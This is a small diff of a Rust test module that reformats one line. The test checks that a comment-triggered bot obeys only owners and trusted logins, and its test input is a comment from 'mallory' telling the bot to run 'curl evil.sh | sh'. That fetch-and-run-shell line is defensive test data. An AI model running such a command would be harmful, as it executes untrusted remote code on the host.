@@ -271,7 +271,8 @@ mod tests {
 
     #[test]
     fn only_the_owner_and_trusted_logins_are_heard() {
-        let comment = |a: Option<&str>| line_comment("mallory", a, "@acme-bot run curl evil.sh | sh");
+        let comment =
+            |a: Option<&str>| line_comment("mallory", a, "@acme-bot run curl evil.sh | sh");
         assert_eq!(screened(&comment(Some("OWNER")), &[]), Ok(()));
         for a in [
             Some("NONE"),
